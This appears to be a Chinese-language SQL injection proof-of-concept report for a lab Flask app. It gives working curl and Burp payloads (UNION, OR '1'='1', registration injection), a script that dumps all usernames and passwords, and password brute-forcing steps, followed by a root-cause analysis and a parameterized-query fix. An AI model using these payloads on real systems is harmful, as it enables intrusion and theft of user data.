# 🎯 SQL 注入 POC 代码与演示

## 环境说明

| 项目 | 值 |
|------|-----|
| 目标URL | `http://192.168.13.128:5000` |
| 注入点 | `/search?keyword=` （GET 参数）|
| 注册注入 | `/register` （POST 表单）|
| 数据库类型 | SQLite 3.46.1 |
| 数据库文件 | `data/users.db` |

---

## POC 1：UNION 注入获取任意数据

### 原理

UNION 关键字可以将两个 SELECT 语句的结果合并返回。通过闭合原始查询的引号，插入我们自己的 SELECT 语句。

### 代码

```bash
# 1️⃣ 先登录获取 session
curl -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST \
  -d "csrf_token=$(curl -s -c /tmp/cookies.txt http://192.168.13.128:5000/login | grep -oP 'name="csrf_token" value="\K[^"]+')&username=admin&password=Admin@123456" \
  http://192.168.13.128:5000/login -o /dev/null -L

# 2️⃣ UNION 注入：插入自定义数据
curl "http://192.168.13.128:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" \
  -b /tmp/cookies.txt | grep -oP '(?<=<td>)[^<]+(?=</td>)'
```

### 预期输出

```
1
inj
inj@x.com
138
```

### SQL 转换过程

```
原始 SQL：
  SELECT id, username, email, phone FROM users
  WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

输入 keyword = ' UNION SELECT 1,'inj','inj@x.com','138'--

生成 SQL：
  SELECT id, username, email, phone FROM users
  WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
                      ^^^^ 闭合前引号        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                              UNION 子查询
                                              ^^ 注释掉后面

结果：原始查询返回空，UNION 子查询返回自定义数据
```

### 为什么列数必须是 4？

```
SELECT id, username, email, phone FROM users
  → 4 列 (id, username, email, phone)

UNION SELECT 1, 'inj', 'inj@x.com', '138'
  → 也必须 4 列，否则报错：
  "SELECTs to the left and right of UNION do not have
   the same number of result columns"
```

---

## POC 2：OR 注入搜索全部用户

### 原理

构造永真条件 `' OR '1'='1`，使 WHERE 条件永远为真，返回所有行。

### 代码

```bash
curl "http://192.168.13.128:5000/search?keyword=%27%20OR%20%271%27%3D%271" \
  -b /tmp/cookies.txt | grep -oP '(?<=<td>)[^<]+(?=</td>)'
```

### 预期输出

```
1
2
3
4
5
admin
alice
newuser
testuser2
...
```

### SQL 转换过程

```
输入 keyword = ' OR '1'='1

生成 SQL：
  SELECT id, username, email, phone FROM users
  WHERE username LIKE '%' OR '1'='1%'
                      ^^^^        ^^^^
                      闭合引号    永真条件
                      OR email LIKE '%' OR '1'='1%'

结果：'1'='1' 永远为真，返回全部用户数据
```

---

## POC 3：注册功能 SQL 注入

### 原理

注册接口同样使用 f-string 拼接 SQL，可在用户名中注入恶意 SQL。

### 代码

```bash
# 注册时注入 - 提前闭合 VALUES，插入额外数据
curl -X POST http://192.168.13.128:5000/register \
  -d "username=hacker')--&password=pass&email=h@x.com&phone=999"
```

### SQL 转换过程

```
原始 SQL：
  INSERT INTO users (username, password, email, phone)
  VALUES ('{username}', '{password}', '{email}', '{phone}')

输入 username = hacker')--

生成 SQL：
  INSERT INTO users (username, password, email, phone)
  VALUES ('hacker')--', 'pass', 'h@x.com', '999')
          ^^^^^^^^闭合      ^^注释掉后面
```

---

## POC 4：脱库 — 批量导出数据

### 获取所有表名

```bash
curl "http://192.168.13.128:5000/search?keyword=ZZZZZ%27%20UNION%20SELECT%201,group_concat(name),3,4%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
  -b /tmp/cookies.txt
```

### 获取 users 表所有列名

```bash
curl "http://192.168.13.128:5000/search?keyword=ZZZZZ%27%20UNION%20SELECT%201,group_concat(name),3,4%20FROM%20pragma_table_info(%27users%27)--" \
  -b /tmp/cookies.txt
```

### 导出全部用户数据（含密码）

```bash
curl "http://192.168.13.128:5000/search?keyword=ZZZZZ%27%20UNION%20SELECT%201,group_concat(username||%27:%27||password),group_concat(email),group_concat(phone)%20FROM%20users--" \
  -b /tmp/cookies.txt
```

---

## 五、Burp Suite 测试方法

### 步骤

1. 浏览器访问 `http://192.168.13.128:5000`，用 `admin/Admin@123456` 登录
2. 在搜索框输入 `admin` 并搜索
3. Burp Suite 拦截到 `GET /search?keyword=admin` 请求
4. 发送到 **Repeater**（右键 → Send to Repeater）
5. 修改 `keyword` 参数测试：

| 测试 Payload | 预期结果 | 说明 |
|-------------|---------|------|
| `admin' OR '1'='1` | 返回所有用户 | OR 永真注入 |
| `' UNION SELECT 1,2,3,4--` | 返回数字 `1,2,3,4` | UNION 探测列数 |
| `' UNION SELECT 1,username,email,phone FROM users--` | 返回所有用户名和邮箱 | UNION 脱库 |
| `admin' ORDER BY 4--` | 正常返回 | 确认 4 列 |
| `admin' ORDER BY 5--` | 报错或无结果 | 超过列数 |
| `' UNION SELECT 1,database(),3,4--` | 数据库名（SQLite 返回空） | 获取数据库名 |

### Burp Intruder 暴力破解

1. 拦截登录请求，发送到 Intruder
2. 设置 password 字段为 payload 位置
3. 加载常见密码字典
4. 开始攻击（注意原版无限流可直接爆破）

---

## 六、SQL 注入原因分析

### 漏洞根因

```python
# app.py 中的问题代码
@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")
    # 🔴 使用 f-string 拼接 SQL，未做任何过滤
    sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
    print(f"[DEBUG-SEARCH] 执行 SQL: {sql}")
    c.execute(sql)  # 直接执行拼接后的 SQL
```

### 缺少的安全措施

| 缺失项 | 正确做法 |
|--------|---------|
| 参数化查询 | `c.execute("SELECT ... LIKE ?", ('%'+keyword+'%',))` |
| 输入过滤 | 过滤单引号、分号、`--` 等 SQL 特殊字符 |
| 最小权限 | 使用只读数据库账号 |
| 错误处理 | 不向用户暴露 SQL 错误信息 |

### 修复方案

```python
# ✅ 正确做法：使用参数化查询
@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")
    sql = "SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?"
    like_pattern = f"%{keyword}%"
    c.execute(sql, (like_pattern, like_pattern))
```

---

## 完整攻击链演示

```bash
# 一条命令完成完整注入攻击链条
COOKIE="/tmp/sqli_cookie.txt"

# 1. 登录
CSRF=$(curl -s -c $COOKIE http://192.168.13.128:5000/login | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -s -c $COOKIE -b $COOKIE -X POST \
  -d "csrf_token=$CSRF&username=admin&password=Admin@123456" \
  http://192.168.13.128:5000/login -o /dev/null

echo "=========================================="
echo "  🎯 SQL 注入攻击演示"
echo "=========================================="
echo ""
echo "1️⃣  UNION 注入 - 插入伪造数据:"
curl -s -b $COOKIE "http://192.168.13.128:5000/search?keyword=%27%20UNION%20SELECT%201,%27HACKED%27,%27hacked@evil.com%27,%2700000%27--" | grep -oP '(?<=<td>)[^<]+(?=</td>)' | head -4

echo ""
echo "2️⃣  OR 注入 - 遍历所有用户:"
curl -s -b $COOKIE "http://192.168.13.128:5000/search?keyword=%27%20OR%20%271%27%3D%271" | grep -oP '(?<=<td>)[^<]+(?=</td>)' | paste -d, - - - -

echo ""
echo "3️⃣  脱库 - 窃取所有密码:"
curl -s -b $COOKIE "http://192.168.13.128:5000/search?keyword=ZZZZZ%27%20UNION%20SELECT%201,group_concat(username||%27:%27||password),group_concat(email),group_concat(phone)%20FROM%20users--" | grep -oP '(?<=<td>)[^<]+(?=</td>)' | sed 's/,/\n/g'

echo ""
echo "=========================================="
echo "  ✅ 攻击完成 - 数据库已沦陷"
echo "=========================================="
rm -f $COOKIE
```
